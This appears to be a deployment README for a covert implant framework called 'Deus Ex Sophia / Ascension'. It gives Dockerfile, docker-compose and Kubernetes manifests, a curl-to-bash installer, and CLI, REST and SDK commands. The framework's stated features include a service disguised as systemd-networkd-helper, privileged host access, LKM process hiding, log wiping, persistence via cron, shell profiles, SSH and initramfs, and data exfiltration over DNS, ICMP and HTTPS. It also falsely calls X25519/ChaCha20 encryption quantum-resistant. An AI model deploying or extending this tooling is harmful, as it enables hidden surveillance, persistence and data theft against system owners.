# Dockerfile
FROM ubuntu:22.04

# Set environment
ENV DEBIAN_FRONTEND=noninteractive
ENV TZ=UTC

# Install base system
RUN apt-get update && apt-get install -y \
    sudo curl wget git gnupg2 software-properties-common \
    python3 python3-pip python3-dev python3-venv \
    net-tools iproute2 dnsutils nmap tcpdump \
    jq sqlite3 openssl libssl-dev libffi-dev \
    build-essential pkg-config autoconf automake libtool \
    && rm -rf /var/lib/apt/lists/*

# Create system structure
RUN mkdir -p /opt/sysaux/{bin,modules,data,logs,config,backups} \
    && mkdir -p /usr/local/lib/.systemd-aux/{beacons,tunnels,exfil,cache,backups} \
    && mkdir -p /opt/sysaux/.network/{passive,active,threat,visual,data,logs,config} \
    && mkdir -p /opt/sysaux/.matrix/{core,channels,payloads,handlers,exfil,stealth,keys} \
    && chmod -R 700 /opt/sysaux

# Copy Ascension system
COPY phases/ /opt/sysaux/
COPY scripts/ /opt/sysaux/bin/

# Set permissions
RUN chmod -R 700 /opt/sysaux/bin/* \
    && chown -R root:root /opt/sysaux \
    && ln -sf /opt/sysaux/bin/ascend /usr/local/bin/ascend \
    && ln -sf /opt/sysaux/bin/network_oracle /usr/local/bin/network_oracle \
    && ln -sf /opt/sysaux/bin/matrix_orchestrator /usr/local/bin/matrix_orchestrator

# Create entrypoint
COPY entrypoint.sh /entrypoint.sh
RUN chmod +x /entrypoint.sh

# Health check
HEALTHCHECK --interval=30s --timeout=10s --start-period=5s --retries=3 \
    CMD systemctl is-active systemd-networkd-helper.service || exit 1

EXPOSE 8080 53/udp 53/tcp

ENTRYPOINT ["/entrypoint.sh"]
CMD ["ascend"]
Option 2: Microservices Architecture
# docker-compose.yml
version: '3.8'

services:
  # Core system
  sophia-core:
    build: ./core
    image: deus-ex-sophia/core:5.0
    container_name: sophia-core
    restart: unless-stopped
    privileged: true
    cap_add:
      - NET_ADMIN
      - NET_RAW
      - SYS_ADMIN
    volumes:
      - sophia_data:/opt/sysaux
      - sophia_persistence:/usr/local/lib/.systemd-aux
      - /etc/systemd/system:/host_systemd:ro
    networks:
      - sophia_net
    command: ["core_truth.py", "--daemon"]

  # Network intelligence
  network-oracle:
    build: ./network
    image: deus-ex-sophia/network:5.0
    container_name: network-oracle
    restart: unless-stopped
    network_mode: "host"
    privileged: true
    cap_add:
      - NET_ADMIN
      - NET_RAW
    volumes:
      - sophia_data:/opt/sysaux/.network
      - /var/run/docker.sock:/var/run/docker.sock:ro
    depends_on:
      - sophia-core
    command: ["network_oracle", "dashboard"]

  # Exfiltration matrix
  matrix-orchestrator:
    build: ./matrix
    image: deus-ex-sophia/matrix:5.0
    container_name: matrix-orchestrator
    restart: unless-stopped
    volumes:
      - sophia_data:/opt/sysaux/.matrix
      - matrix_exfil:/opt/sysaux/.matrix/exfil
    networks:
      - sophia_net
    depends_on:
      - network-oracle
    command: ["matrix_orchestrator", "dashboard"]

  # Web dashboard
  dashboard:
    build: ./dashboard
    image: deus-ex-sophia/dashboard:5.0
    container_name: sophia-dashboard
    restart: unless-stopped
    ports:
      - "8080:8080"
      - "8443:8443"
    volumes:
      - sophia_data:/opt/sysaux
      - dashboard_static:/var/www/html
    depends_on:
      - matrix-orchestrator
    command: ["python3", "-m", "http.server", "8080"]

volumes:
  sophia_data:
    driver: local
    driver_opts:
      type: none
      o: bind
      device: ./data
  sophia_persistence:
  matrix_exfil:
    driver: local
    driver_opts:
      type: tmpfs
      device: tmpfs
  dashboard_static:

networks:
  sophia_net:
    driver: bridge
    ipam:
      config:
        - subnet: 172.20.0.0/24
Option 3: Kubernetes Deployment
# kubernetes/sophia-deployment.yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: deus-ex-sophia
  namespace: sophia-system
  labels:
    app: sophia
    version: "5.0"
spec:
  replicas: 1
  selector:
    matchLabels:
      app: sophia-core
  template:
    metadata:
      labels:
        app: sophia-core
        version: "5.0"
    spec:
      serviceAccountName: sophia-sa
      automountServiceAccountToken: true
      securityContext:
        runAsUser: 0
        runAsGroup: 0
        fsGroup: 0
      containers:
      - name: sophia-core
        image: deus-ex-sophia/core:5.0
        imagePullPolicy: IfNotPresent
        securityContext:
          privileged: true
          capabilities:
            add: ["NET_ADMIN", "NET_RAW", "SYS_ADMIN", "IPC_LOCK"]
        ports:
        - containerPort: 8080
          name: dashboard
        - containerPort: 53
          name: dns
          protocol: UDP
        env:
        - name: SOPHIA_ENV
          value: "kubernetes"
        - name: POD_NAME
          valueFrom:
            fieldRef:
              fieldPath: metadata.name
        - name: NODE_NAME
          valueFrom:
            fieldRef:
              fieldPath: spec.nodeName
        volumeMounts:
        - name: sophia-data
          mountPath: /opt/sysaux
        - name: sophia-secrets
          mountPath: /opt/sysaux/.keys
          readOnly: true
        - name: systemd-socket
          mountPath: /run/systemd
        resources:
          requests:
            memory: "512Mi"
            cpu: "500m"
          limits:
            memory: "2Gi"
            cpu: "2"
        livenessProbe:
          exec:
            command: ["/opt/sysaux/bin/resilience.sh", "check"]
          initialDelaySeconds: 30
          periodSeconds: 60
        readinessProbe:
          tcpSocket:
            port: 8080
          initialDelaySeconds: 5
          periodSeconds: 10
      volumes:
      - name: sophia-data
        persistentVolumeClaim:
          claimName: sophia-data-pvc
      - name: sophia-secrets
        secret:
          secretName: sophia-encryption-keys
      - name: systemd-socket
        hostPath:
          path: /run/systemd
          type: Directory
---
apiVersion: v1
kind: Service
metadata:
  name: sophia-service
  namespace: sophia-system
spec:
  selector:
    app: sophia-core
  ports:
  - name: dashboard
    port: 8080
    targetPort: 8080
    nodePort: 30080
  - name: dns-udp
    port: 53
    targetPort: 53
    protocol: UDP
    nodePort: 30053
  - name: dns-tcp
    port: 53
    targetPort: 53
    protocol: TCP
    nodePort: 30053
  type: NodePort
---
apiVersion: v1
kind: PersistentVolumeClaim
metadata:
  name: sophia-data-pvc
  namespace: sophia-system
spec:
  accessModes:
    - ReadWriteOnce
  resources:
    requests:
      storage: 10Gi
  storageClassName: fast-ssd
🚀 Quick Start
Bare Metal Installation
# 1. Clone or create installation script
curl -sL https://raw.githubusercontent.com/deus-ex-sophia/ascension/main/install.sh -o install.sh

# 2. Make executable and run
chmod +x install.sh
sudo ./install.sh

# 3. OR run directly
sudo bash -c "$(curl -fsSL https://raw.githubusercontent.com/deus-ex-sophia/ascension/main/install.sh)"

# 4. Initialize system
sudo ascend --init

# 5. Start services
sudo systemctl start systemd-networkd-helper
sudo systemctl start network-oracle
sudo systemctl start matrix-orchestrator
Docker Quick Deploy
# Single command deployment
docker run -d \
  --name deus-ex-sophia \
  --restart unless-stopped \
  --privileged \
  --cap-add=NET_ADMIN \
  --cap-add=NET_RAW \
  --cap-add=SYS_ADMIN \
  -p 8080:8080 \
  -p 53:53/udp \
  -p 53:53/tcp \
  -v sophia_data:/opt/sysaux \
  -v /etc/systemd/system:/host_systemd:ro \
  deus-ex-sophia/full:5.0

# Access dashboard
xdg-open http://localhost:8080
🔧 Configuration
Environment Variables
# Core settings
export SOPHIA_ENV="production"
export SOPHIA_STEALTH_LEVEL="9"
export SOPHIA_ENCRYPTION_EPOCH="hourly"
export SOPHIA_EXFIL_INTERVAL="300"

# Network settings
export SOPHIA_NETWORK_MONITOR="all"
export SOPHIA_SCAN_INTENSITY="5"
export SOPHIA_THREAT_UPDATE="3600"

# Exfiltration settings
export SOPHIA_EXFIL_CHANNELS="dns,https,icmp"
export SOPHIA_DEAD_DROP_ENABLED="true"
export SOPHIA_STEGANOGRAPHY_ENABLED="false"

# Security settings
export SOPHIA_KEY_ROTATION="enabled"
export SOPHIA_TAMPER_DETECTION="enabled"
export SOPHIA_SELF_REPAIR="enabled"
Configuration Files
/opt/sysaux/config/core.json - Core system configuration
/opt/sysaux/.network/config/intensity.conf - Scan intensity
/opt/sysaux/.network/config/interface.conf - Monitoring interfaces
/opt/sysaux/.matrix/config/channels.json - Exfiltration channels
/opt/sysaux/.matrix/config/encryption.json - Encryption settings
📊 Monitoring & Management
Command Line Interface
# System control
ascend status                    # Overall system status
ascend start                     # Start all services
ascend stop                      # Stop all services
ascend restart                   # Restart system
ascend logs                      # View system logs
ascend backup                    # Create backup
ascend restore <backup>          # Restore from backup
ascend uninstall                 # Remove system (requires confirmation)

# Network intelligence
network_oracle                   # Interactive network suite
network_oracle dashboard         # Real-time dashboard
network_oracle passive status    # Passive monitoring status
network_oracle active scan       # Network scan
network_oracle threat report     # Threat intelligence report

# Exfiltration matrix
matrix_orchestrator              # Interactive matrix control
matrix_orchestrator dashboard    # Exfiltration dashboard
matrix_orchestrator quantum status  # Encryption status
matrix_orchestrator payload generate  # Create payload
matrix_orchestrator pipeline     # Full exfiltration pipeline
Web Dashboard
URL: http://localhost:8080 or https://localhost:8443
Features:
Real-time system monitoring
Network intelligence visualization
Exfiltration status and controls
Threat intelligence feeds
Log viewer and analyzer
Configuration management
API Endpoints (REST)
# System API
GET  /api/v1/status              # System status
GET  /api/v1/health             # Health check
POST /api/v1/backup             # Create backup
POST /api/v1/restore            # Restore backup

# Network API
GET  /api/v1/network/hosts      # Discovered hosts
GET  /api/v1/network/scan       # Scan results
POST /api/v1/network/scan       # Initiate scan
GET  /api/v1/network/threats    # Threat intelligence

# Exfiltration API
POST /api/v1/exfil/payload      # Create payload
POST /api/v1/exfil/send         # Send payload
GET  /api/v1/exfil/status       # Exfiltration status
GET  /api/v1/exfil/logs         # Exfiltration logs
🔒 Security Features
Encryption
Quantum-resistant: X25519 key exchange with ChaCha20-Poly1305
Forward secrecy: Hourly key rotation with HKDF derivation
Deniable encryption: Multiple plausible payload layers
Key management: Encrypted key storage with tamper detection
Stealth
Process hiding: Multiple techniques including LKM and namespace hiding
Traffic normalization: Legitimate-looking network patterns
Anti-forensics: Log cleaning and trace removal
Plausible deniability: Legitimate-appearing system functions
Persistence
Multi-layer: systemd, cron, profile, initramfs, kernel
Self-repair: Automatic detection and restoration
Tamper detection: Hash-based file integrity monitoring
Rollback capability: Snapshot-based recovery system
📈 Phases Overview
Phase 1: Environment Sanitization
Root privilege verification
System update and bloat removal
Secure kernel parameter configuration
Telemetry and reporting removal
Phase 2: Core Installation with Truth
Hidden directory structure creation
Essential tool compilation from source
Enhanced core truth module with quantum encryption
Adaptive beaconing and monitoring
Phase 3: Multi-Vector Persistence Engine
Stealth systemd service integration
Hidden cron job installation
Shell profile modifications
SSH stealth configuration
Initramfs boot persistence
Intelligent network rules
Process hiding techniques
Backup and resilience system
Phase 4: Network Intelligence Expansion
Passive network monitoring (raw sockets)
Active reconnaissance with stealth scanning
Threat intelligence with local database
Real-time dashboard and visualization
Data export and reporting
Phase 5: Advanced Exfiltration Matrix
Quantum encryption layer
Multi-channel exfiltration (DNS, HTTPS, ICMP, SMTP, SSH)
Payload generation factory (10+ types)
Stealth delivery handlers (dead drops, covert channels, steganography)
Matrix orchestrator with unified control
🚨 Migration & Upgrades
Version Migration
# Backup current installation
sudo ascend backup --full

# Extract migration script
sudo tar -xzf sophia-migration-5.0.tar.gz -C /tmp

# Run migration
sudo /tmp/migrate.sh --from 4.0 --to 5.0

# Verify migration
sudo ascend verify --migration

# Rollback if needed
sudo ascend restore /opt/sysaux/backups/pre-migration.tar.gz
Data Migration
# Export data from old system
sudo network_oracle export --format json --output /tmp/network_data.json
sudo matrix_orchestrator export --output /tmp/matrix_data.tar

# Import to new system
sudo network_oracle import --file /tmp/network_data.json
sudo matrix_orchestrator import --file /tmp/matrix_data.tar

# Verify import
sudo network_oracle status
sudo matrix_orchestrator status
Configuration Migration
# Export configuration
sudo ascend config export --output /tmp/sophia_config.tar

# Import configuration (on new system)
sudo ascend config import --file /tmp/sophia_config.tar

# Apply configuration
sudo ascend config apply
🛠️ Troubleshooting
Common Issues
Permission Denied
sudo chmod -R 700 /opt/sysaux
sudo chown -R root:root /opt/sysaux
Service Not Starting
sudo systemctl daemon-reload
sudo systemctl restart systemd-networkd-helper
journalctl -u systemd-networkd-helper -f
Network Monitoring Issues
# Check interfaces
ip link show
sudo network_oracle status

# Check raw socket permissions
getcap /opt/sysaux/bin/* 2>/dev/null
Encryption Problems
# Regenerate keys
sudo rm -rf /opt/sysaux/.matrix/keys/*
sudo matrix_orchestrator quantum start --force

# Verify encryption
sudo matrix_orchestrator quantum test
Logs Location
System logs: /opt/sysaux/logs/
Network intelligence: /opt/sysaux/.network/logs/
Exfiltration: /opt/sysaux/.matrix/exfil/
Systemd: journalctl -u systemd-networkd-helper
Kernel: dmesg | grep -i sophia
Debug Mode
# Enable debug logging
export SOPHIA_DEBUG="true"
export SOPHIA_LOG_LEVEL="debug"

# Run with verbose output
ascend --verbose --debug
network_oracle --verbose
matrix_orchestrator --verbose
📚 API Documentation
REST API

Full OpenAPI 3.0 specification available at /api/v1/docs when dashboard is running.

Python SDK
from sophia_sdk import SophiaClient

# Initialize client
client = SophiaClient(
    base_url="http://localhost:8080",
    api_key="your_api_key"
)

# System operations
status = client.get_status()
health = client.get_health()
backup = client.create_backup()

# Network operations
hosts = client.get_network_hosts()
scan = client.start_network_scan("192.168.1.0/24")
threats = client.get_threat_intel()

# Exfiltration operations
payload = client.create_payload("system_info")
result = client.exfiltrate(payload, channel="dns")
logs = client.get_exfil_logs()
WebSocket API
// Real-time updates
const ws = new WebSocket('ws://localhost:8080/ws');

ws.onmessage = (event) => {
    const data = JSON.parse(event.data);
    
    switch(data.type) {
        case 'system_status':
            updateSystemStatus(data.payload);
            break;
        case 'network_update':
            updateNetworkMap(data.payload);
            break;
        case 'exfil_status':
            updateExfilStatus(data.payload);
            break;